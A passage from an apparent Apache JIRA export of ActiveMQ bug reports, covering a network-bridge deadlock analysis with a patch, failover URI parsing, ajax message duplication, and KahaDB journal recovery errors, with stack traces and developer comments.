	ManagedTransportConnection(TransportConnection).processDispatch(Command) line: 810	
	ManagedTransportConnection(TransportConnection).dispatchSync(Command) line: 770	
	QueueSubscription(PrefetchSubscription).dispatch(MessageReference) line: 649	
	QueueSubscription(PrefetchSubscription).dispatchPending() line: 599	
	QueueSubscription(PrefetchSubscription).add(MessageReference) line: 156	
	Queue.doActualDispatch(List<QueueMessageReference>) line: 1798	
	Queue.doDispatch(List<QueueMessageReference>) line: 1745	
	Queue.pageInMessages(boolean) line: 1898	
	Queue.iterate() line: 1425	
	PooledTaskRunner.runTask() line: 122	
	PooledTaskRunner$1.run() line: 43	
	ThreadPoolExecutor$Worker.runTask(Runnable) line: 886	
	ThreadPoolExecutor$Worker.run() line: 908	
	Thread.run() line: 662	

Daemon Thread [VMTransport] (Suspended)	
	owns: Object  (id=499)	
	owns: RegionBroker$1  (id=205)	
		waited by: Daemon Thread [VMTransport] (Running)	
		waited by: Daemon Thread [ActiveMQ Broker[broker1] Scheduler] (Running)	
	owns: Object  (id=108)	
		waited by: Daemon Thread [BrokerService[broker1] Task] (Suspended)	
	owns: URI  (id=500)	
	Unsafe.park(boolean, long) line: not available [native method]	
	LockSupport.park(Object) line: 158	
	ReentrantReadWriteLock$NonfairSync(AbstractQueuedSynchronizer).parkAndCheckInterrupt() line: 811	
	ReentrantReadWriteLock$NonfairSync(AbstractQueuedSynchronizer).acquireQueued(AbstractQueuedSynchronizer$Node, int) line: 842	
	ReentrantReadWriteLock$NonfairSync(AbstractQueuedSynchronizer).acquire(int) line: 1178	
	ReentrantReadWriteLock$WriteLock.lock() line: 807	
	Queue.addSubscription(ConnectionContext, Subscription) line: 360	
	ManagedQueueRegion(AbstractRegion).addConsumer(ConnectionContext, ConsumerInfo) line: 290	
	ManagedRegionBroker(RegionBroker).addConsumer(ConnectionContext, ConsumerInfo) line: 444	
	ManagedRegionBroker.addConsumer(ConnectionContext, ConsumerInfo) line: 240	
	AdvisoryBroker(BrokerFilter).addConsumer(ConnectionContext, ConsumerInfo) line: 89	
	AdvisoryBroker.addConsumer(ConnectionContext, ConsumerInfo) line: 91	
	CompositeDestinationBroker(BrokerFilter).addConsumer(ConnectionContext, ConsumerInfo) line: 89	
	TransactionBroker(BrokerFilter).addConsumer(ConnectionContext, ConsumerInfo) line: 89	
	BrokerService$3(MutableBrokerFilter).addConsumer(ConnectionContext, ConsumerInfo) line: 95	
	ManagedTransportConnection(TransportConnection).processAddConsumer(ConsumerInfo) line: 550	
	ConsumerInfo.visit(CommandVisitor) line: 349	
	
Specifically, a message had been produced to one of the shared queues and was being dispatched to a remote consumer by the BrokerService thread.  In so doing, BrokerService had acquired the pagedInPendingDispatchLock lock from Queue.java:

    private void doDispatch(List<QueueMessageReference> list) throws Exception {
        boolean doWakeUp = false;

        pagedInPendingDispatchLock.writeLock().lock();
	
BrokerService had sent the message to the remote broker was then acknowledging the local transport in DemandForwardingBridgeSupport.java:

    protected void serviceLocalCommand(Command command) {
    ...
                        if (!message.isResponseRequired()) {
                            
                            // If the message was originally sent using async
                            // send, we will preserve that QOS
                            // by bridging it using an async send (small chance
                            // of message loss).
                            try {
                                remoteBroker.oneway(message);
                                localBroker.oneway(new MessageAck(md, MessageAck.INDIVIDUAL_ACK_TYPE, 1));

Since localBroker was a synchronous VMTransport, BrokerService had to then acquire the write mutex in MutexTransport.java:

    public void oneway(Object command) throws IOException {
        synchronized (writeMutex) {
            next.oneway(command);
        }
    }

So the dispatching thread (BrokerService) had acquired Queue.pagedInPendingDispatchLock was trying to acquire MutexTransport.writeMutex.

At the same time, a new remote consumer was being registered through the same outbound bridge through which the aforementioned dispatch was ocurring.  The bridge's remote transport listener thread (in this example, VMTransport) was adding the subscription through DemandForwardingBridgeSupport.java:

    protected void addSubscription(DemandSubscription sub) throws IOException {
        if (sub != null) {
            localBroker.oneway(sub.getLocalInfo());
        }
    }

Again, localBroker is synchronous, so the VMTransport thread acquired MutexTransport.writeMutex.  Registration of consumers to a queue is synchronized with the dispatching of messages, as shown in Queue.java:

    public void addSubscription(ConnectionContext context, Subscription sub) throws Exception {
        super.addSubscription(context, sub);
        // synchronize with dispatch method so that no new messages are sent
        // while setting up a subscription. avoid out of order messages,
        // duplicates, etc.
        pagedInPendingDispatchLock.writeLock().lock();

So the remote transport listening thread (VMTransport) had acquired MutexTransport.writeMutex and was trying to acquire Queue.pagedInPendingDispatchLock, thus creating a deadlock with BrokerService.

Solution
======
Deadlock can be avoided by making the local transport asynchronous, which would allow the remote transport listener thread to acquire the MutexTransport.writeMutex, but then offload the acquisition of Queue.pagedInPendingDispatchLock to its peer listening thread.  We've included a unit test that passes with this change.

There is no clear reason why the local transport is asynchronous.  This is enforced by BrokerService.java when it starts the network connectors:

    protected void startAllConnectors() throws Exception {
....
            URI uri = getVmConnectorURI();
            Map<String, String> map = new HashMap<String, String>(URISupport.parseParameters(uri));
            map.put(""network"", ""true"");
            map.put(""async"", ""false"");

This change was made by the following checkin, but no rational was given:

Revision: 553094
Author: rajdavies
Date: 11:33:48 PM, July 3, 2007
Message:
set async=false for network connectors
----
Modified : /activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/BrokerService.java

Addendum
=========
We've included a unit test that demonstrates the deadlock 100% of the time on our systems.  Since this is a timing issue, you may need to run the unit test several times to create the deadlock.  Also note that three specific configurations must exist to create the deadlock:

1) The bridge must have conduit subscriptions disabled; this is so that there can be an existing subscription across the bridge to which messages are being dispatched while at the same time another subscription is being added.
2) The bridge must be configured to dispatch synchronously; this is so that message subscriptions are are dispatched by the same thread that accesses the queue.
3) The message producers must be transactionalized; this is so that the message dispatches require a response by the dispatch thread (i.e., BrokerService).

If any of these conditions is not present, deadlock (at least through this recreation) does not occur.	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	




Through further testing ",,stirlingc,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3185,AMQ-4632,,,,,,,,,,,,,,,"10/Jan/11 21:52;stirlingc;AMQ-3127.diff;https://issues.apache.org/jira/secure/attachment/12467923/AMQ-3127.diff","24/Oct/12 23:29;stirlingc;BridgeDeadlockTest.java;https://issues.apache.org/jira/secure/attachment/12550705/BridgeDeadlockTest.java","10/Jan/11 22:57;stirlingc;BridgeDeadlockTest.java;https://issues.apache.org/jira/secure/attachment/12467935/BridgeDeadlockTest.java",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74730,,,Fri Jul 11 19:00:55 UTC 2014,,,,,,,Patch Available,,,,"0|i0b2ev:",62503,,,,,,,,,,,,,,,,,,,,,"10/Jan/11 21:52;stirlingc;Unit test demonstrating deadlock.  The unit test passes after applying the patch.;;;","10/Jan/11 21:52;stirlingc;Patch the resolves deadlock by making the local transport for a bridge asynchronous.;;;","10/Jan/11 22:57;stirlingc;Unit test (amended to enable timeout) that demonstrates deadlock.  The test passes after applying patch.;;;","11/Jan/11 14:20;gtully;Great investigative work. we ping rob to see if he has any recollection as to the reason/use case behind the Revision: 553094
Did you try a bunch of the other network connector unit tests org.apache.activemq.network in activemq-core with this fix?
;;;","11/Jan/11 20:34;stirlingc;Gary, I ran the tests in org.apache.activemq.network several times and they succeeded.  If after consultation with Rob it is decided that the patch is too broad, we could always patch just the DiscoveryNetworkConnector/DemandForwardingBridgeSupport so that they make the localTransport asynchronous.

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running org.apache.activemq.network.NetworkLoadTest
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 65.782 sec
Running org.apache.activemq.network.DemandForwardingBridgeFilterTest
Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 24.859 sec
Running org.apache.activemq.network.NetworkReconnectTest
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 6.391 sec
Running org.apache.activemq.network.DuplexNetworkTest
Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 77.36 sec
Running org.apache.activemq.network.ForwardingBridgeTest
Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 8.5 sec
Running org.apache.activemq.network.SimpleNetworkTest
Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 73.5 sec
Running org.apache.activemq.network.DuplexNetworkMBeanTest
Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 29.532 sec
Running org.apache.activemq.network.NetworkRemovesSubscriptionsTest
Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 34.406 sec
Running org.apache.activemq.network.DemandForwardingBridgeTest
Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 4.703 sec
Running org.apache.activemq.network.FailoverStaticNetworkTest
Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 32.203 sec
Running org.apache.activemq.network.NetworkBrokerDetachTest
Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 22.501 sec

Results :

Tests run: 41, Failures: 0, Errors: 0, Skipped: 0
;;;","09/Feb/12 16:54;tabish;Ran the test repeatedly and could not reproduce using the latest trunk code.;;;","24/Oct/12 23:27;stirlingc;Attaching a slightly-modified unit test the demonstrates the deadlock is still present on trunk code.;;;","24/Oct/12 23:34;stirlingc;The only change in the updated BridgeDeadlockTest is the addition of line 72: persistentDelivery = false

The reason the original unit test passed on trunk as because of changes made to DemandForwardingBridgeSupport.java:

{code:title=DemandForwardingBridgeSupport.java}
protected void serviceLocalCommand(Command command) {
...
                    if (!configuration.isAlwaysSyncSend() && !message.isPersistent()) {

                        // If the message was originally sent using async
                        // send, we will preserve that QOS
                        // by bridging it using an async send (small chance
                        // of message loss).
                        try {
                            remoteBroker.oneway(message);
                            localBroker.oneway(new MessageAck(md, MessageAck.INDIVIDUAL_ACK_TYPE, 1));
                            dequeueCounter.incrementAndGet();
                        } finally {
                            sub.decrementOutstandingResponses();
                        }

                    } else {
{code}

As originally described, the problematic code is the localBroker.oneway(...).  In trunk, the condition (!configuration.isAlwaysSincSend() && !message.isPersistent()) was preventing the original test from entering this block.  Setting persistentDelivery = false allows the block to be entered, thus creating the deadlock.;;;","11/Jul/14 19:00;tabish;Testing against trunk the problem appears to be resolved, the code has been modified since the original issue and does not appear to have this issue any longer. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
updateClusterFilter/ClientsOnRemove broken when running JMX broker,AMQ-3125,12495011,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,asussman,asussman,08/Jan/11 02:30,10/Jan/11 15:44,14/Jul/23 05:43,10/Jan/11 15:44,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"The transportConnector settings ""updateClusterFilter"" and ""updateClusterClientsOnRemove"" are not propagated to JMX managed connectors when they are created from the non-JMX managed connectos.  So, even if they are set in the XML, they don't actually work at runtime.",,artnaseef,asussman,chaggstrom,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jan/11 02:31;asussman;amq-3125.patch;https://issues.apache.org/jira/secure/attachment/12467787/amq-3125.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14703,,,Mon Jan 10 15:44:23 UTC 2011,,,,,,,Patch Available,,,,"0|i0ak27:",59523,,,,,,,,,,,,,,,,,,,,,"08/Jan/11 02:31;asussman;Simple patch to add these fields to the the JMX connection creator.;;;","10/Jan/11 15:44;gtully;thanks for the patch. Applied in r1057244;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover transport client gets corrupted connectedBrokers data ,AMQ-3124,12495009,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,asussman,asussman,08/Jan/11 01:59,01/Feb/11 12:44,14/Jul/23 05:43,11/Jan/11 10:30,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"When clients use the Failover transport, the broker will deliver a list of its own uri and also brokers it peers with to the client.  This happens on initial connection and, if configured, as brokers come in and out of the cluster.

The problem is that the entire URI is given, including query string information.  If the query string contains commas in it then the Failover client breaks it up into unusable client uris and will attempt to connect to them.  Also, in 5.4.2, this leads to the same failure that occurs in AMQ-3085.

Also, there doesn't seem to be a point in the client trying to use the same query string parameters that the server is using.

Attached patch strips the query string before sending uris to the client.

Example:

Broker1:

        <transportConnectors>
            <transportConnector name=""openwire+ssl"" uri=""ssl://0.0.0.0:61616?needClientAuth=true&amp;enabledCipherSuites=SSL_RSA_WITH_RC4_128_SHA,SSL_RSA_WITH_3DES_EDE_CBC_SHA,SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA,SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA,TLS_DHE_RSA_WITH_AES_128_CBC_SHA,TLS_DHE_DSS_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_DHE_RSA_WITH_AES_256_CBC_SHA,TLS_DHE_DSS_WITH_AES_256_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA"" />
        </transportConnectors>


With a client connecting to:  failover:(ssl://broker1:61616), you will see (extra debugging added by me):

[DEBUG] FailoverTransport - Failover add: u[0] is: ssl://broker1:61616
[DEBUG] FailoverTransport - Reconnect was triggered but transport is not started yet. Wait for start to connect the transport.
[DEBUG] FailoverTransport - Started.
[DEBUG] FailoverTransport - Waking up reconnect task
[DEBUG] FailoverTransport - urlList connectionList:[ssl://broker1:61616]
[DEBUG] FailoverTransport - Attempting connect to: ssl://broker1:61616
[DEBUG] FailoverTransport - Failover add: u[0] is: TLS_RSA_WITH_AES_256_CBC_SHA
[DEBUG] FailoverTransport - Failover add: u[1] is: TLS_DHE_DSS_WITH_AES_256_CBC_SHA
[DEBUG] FailoverTransport - Failover add: u[2] is: TLS_RSA_WITH_AES_128_CBC_SHA
[DEBUG] FailoverTransport - Failover add: u[3] is: TLS_DHE_RSA_WITH_AES_128_CBC_SHA
[DEBUG] FailoverTransport - Failover add: u[4] is: ssl://broker1:61616?needClientAuth=true&enabledCipherSuites=SSL_RSA_WITH_RC4_128_SHA
[DEBUG] FailoverTransport - Failover add: u[5] is: TLS_DHE_DSS_WITH_AES_128_CBC_SHA
[WARN] FailoverTransport - Transport (broker1/10.73.76.102:61616) failed to ssl://broker1:61616 , attempting to automatically reconnect due to: java.io.IOException: Unexpected error occured
[DEBUG] FailoverTransport - Transport failed with the following exception: <java.io.IOException: Unexpected error occured>java.io.IOException: Unexpected error occured
	at org.apache.activemq.transport.failover.FailoverTransport.add(FailoverTransport.java:614)
	at org.apache.activemq.transport.failover.FailoverTransport.updateURIs(FailoverTransport.java:1049)
	at org.apache.activemq.transport.failover.FailoverTransport.processNewTransports(FailoverTransport.java:285)
	at org.apache.activemq.transport.failover.FailoverTransport.handleConnectionControl(FailoverTransport.java:265)
	at org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(FailoverTransport.java:177)
[DEBUG] FailoverTransport - urlList connectionList:[TLS_RSA_WITH_AES_256_CBC_SHA, ssl://broker1:61616]
[DEBUG] FailoverTransport - Attempting connect to: TLS_RSA_WITH_AES_256_CBC_SHA
[DEBUG] FailoverTransport - Connect fail to: TLS_RSA_WITH_AES_256_CBC_SHA, reason: java.io.IOException: Transport not scheme specified: [TLS_RSA_WITH_AES_256_CBC_SHA]
[DEBUG] FailoverTransport - Attempting connect to: ssl://broker1:61616
[DEBUG] FailoverTransport - Connection established
[INFO] FailoverTransport - Successfully reconnected to ssl://broker1:61616

Note that the stacktrace occurs for the same reason as AMQ-3085, but all the extra work attempting to connect to invalid uris is wasteful.  Also, the client has no need for the query string parameters of the server uris.",,artnaseef,asussman,chaggstrom,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2632,,,,,,,,,,,,,"08/Jan/11 02:01;asussman;amq-3124.patch;https://issues.apache.org/jira/secure/attachment/12467784/amq-3124.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14704,,,Tue Jan 11 10:30:58 UTC 2011,,,,,,,Patch Available,,,,"0|i0ak2f:",59524,,,,,,,,,,,,,,,,,,,,,"08/Jan/11 02:01;asussman;Proposed patch.  Strips query string from uris.;;;","11/Jan/11 10:30;gtully;fix applied in r1057565
reused TransportConnetor.getPublishableConnectString() for the propagated uri in cluster update;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ajax client receives incorrect messages when subscribed to multiple topics,AMQ-3123,12494988,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,alexdean,alexdean,07/Jan/11 21:20,27/Sep/11 21:26,14/Jul/23 05:43,27/Sep/11 21:26,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,"When an ajax client is subscribed to multiple topics, the ""id"" attribute of a returned <response> element indicates to JavaScript which callback function should process the message.  Currently, the MessageListenerServlet returns multiple copies of each message, 1 per subscription.  So all callback functions will receive all messages.

For example, if I send messages 'A1' and 'A2' to /topic/topicA, and messages 'B1' and 'B2' to /topic/topicB, my ajax client gets the following message:
<ajax-response>
  <response id='handlerA' destination='topic://topicA' >A1</response>
  <response id='handlerA' destination='topic://topicA' >B1</response>
  <response id='handlerA' destination='topic://topicA' >A2</response>
  <response id='handlerA' destination='topic://topicA' >B2</response>
  <response id='handlerB' destination='topic://topicB' >A1</response>
  <response id='handlerB' destination='topic://topicB' >B1</response>
  <response id='handlerB' destination='topic://topicB' >A2</response>
  <response id='handlerB' destination='topic://topicB' >B2</response>
</ajax-response>

Further, these messages are constantly re-delivered to the client.  (They are never removed from the unconsumedMessages linked list in AjaxListener.)

If https://issues.apache.org/jira/secure/attachment/12467757/all_messages_are_delivered_to_ajax_clients.patch from https://issues.apache.org/jira/browse/AMQ-3094 is applied, the duplication is reduced, but the ""id"" values for the ""topicB"" messages are still incorrect.

<ajax-response>
  <response id='handlerA' destination='topic://topicA' >A1</response>
  <response id='handlerA' destination='topic://topicA' >B1</response>
  <response id='handlerA' destination='topic://topicA' >A2</response>
  <response id='handlerA' destination='topic://topicA' >B2</response>
</ajax-response>

I've attached a test which demonstrates the problem.  This patch will conflict with the one attached to AMQ-3094, but the conflicts should be easy to resolve.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Feb/11 03:10;alexdean;undelivered_messages_need_associated_consumer.patch;https://issues.apache.org/jira/secure/attachment/12470957/undelivered_messages_need_associated_consumer.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14689,,,Tue Sep 27 21:26:05 UTC 2011,,,,,,,,,,,"0|i0ak2n:",59525,,,,,,,,,,,,,,,,,,,,,"13/Feb/11 03:10;alexdean;Messages which are buffered for later delivery need to be associated with the correct consumer.;;;","27/Sep/11 21:26;tabish;The fixes were applied but this issue seems to have been left open.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Recovery after out of disk space (when space freed up) needs manual intervention,AMQ-3122,12494944,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,07/Jan/11 14:08,21/Jan/11 17:50,14/Jul/23 05:43,07/Jan/11 15:00,5.4.1,5.4.2,,,,5.5.0,,,Message Store,,,,0,,,,,,,,,"When broker runs out of disk space, the journal excepts and the send fails with an exception as expected. The default IO exception handler ignores the exception. (aside: it is possible to install an exception handler that shuts down the broker: http://activemq.apache.org/configurable-ioexception-handling.html)

On restart, the last journal file that failed a write is left with 0 size, this impedes restart recovery as it cannot be parsed.
{code}ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.io.EOFException
java.io.EOFException
	at java.io.RandomAccessFile.readInt(RandomAccessFile.java:725)
	at org.apache.kahadb.journal.DataFileAccessor.readLocationDetails(DataFileAccessor.java:115)
	at org.apache.kahadb.journal.Journal.getNextLocation(Journal.java:498)
	at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:395)
	at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:280)
	at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:321)
	at org.apache.activemq.store.kahadb.MessageDatabase.start(MessageDatabase.java:182)
	at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:183)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:469){code}
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3120,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14702,,,Fri Jan 07 15:00:41 UTC 2011,,,,,,,,,,,"0|i0ak2v:",59526,,,,,,,,,,,,,,,,,,,,,"07/Jan/11 14:59;gtully;There is also an exception variant of the form:{code}java.io.EOFException
	at java.io.RandomAccessFile.readInt(RandomAccessFile.java:725)
	at org.apache.kahadb.journal.DataFileAccessor.readRecord(DataFileAccessor.java:83)
	at org.apache.kahadb.journal.Journal.read(Journal.java:601)
	at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)
	at org.apache.activemq.store.kahadb.MessageDatabase.recoverProducerAudit(MessageDatabase.java:484)
	at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:438)
	at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:315)
	at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:357)
	at org.apache.activemq.store.kahadb.MessageDatabase.doStart(MessageDatabase.java:222)
	at org.apache.activemq.store.kahadb.KahaDBStore.doStart(KahaDBStore.java:180)
	at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53)
	at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:186)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:485){code};;;","07/Jan/11 15:00;gtully;resolved in r#1056327
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"KahaDB error: ""Could not locate data file""",AMQ-3120,12494857,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,dcheckoway,dcheckoway,06/Jan/11 16:46,14/Feb/11 13:20,14/Jul/23 05:43,14/Feb/11 13:20,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"I'm using an embedded broker (version 5.4.2) with persistence enabled.  We're pumping hundreds of millions of messages per day through this thing.  Every once in a while, all of a sudden the KahaDB directory starts growing uncontrollably, and these errors start spewing out in the log over and over...

--------------------------
ERROR; Jan 5, 2011 16:37:57 PM; tid:BrokerService[localhost] Task; AbstractStoreCursor - Failed to fill batch
java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/local/embedded/activemq-data/localhost/KahaDB/db-28098.log
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:265)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:148)
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.hasNext(StoreQueueCursor.java:131)
        at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1679)
        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)
        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)
Caused by: java.io.IOException: Could not locate data file /usr/local/embedded/activemq-data/localhost/KahaDB/db-28098.log
        at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:345)
        at org.apache.kahadb.journal.Journal.read(Journal.java:592)
        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)
        at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:956)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:494)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:485)
        at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:88)
        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:262)
        ... 10 more
ERROR; Jan 5, 2011 16:37:57 PM; tid:BrokerService[localhost] Task; Queue - Failed to page in more queue messages
java.lang.RuntimeException: java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/local/embedded/activemq-data/localhost/KahaDB/db-28098.log
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:151)
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.hasNext(StoreQueueCursor.java:131)
        at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1679)
        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)
        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)
Caused by: java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/local/embedded/activemq-data/localhost/KahaDB/db-28098.log
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:265)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:148)
        ... 9 more
Caused by: java.io.IOException: Could not locate data file /usr/local/embedded/activemq-data/localhost/KahaDB/db-28098.log
        at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:345)
        at org.apache.kahadb.journal.Journal.read(Journal.java:592)
        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)
        at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:956)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:494)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:485)
        at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:88)
        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:262)
        ... 10 more
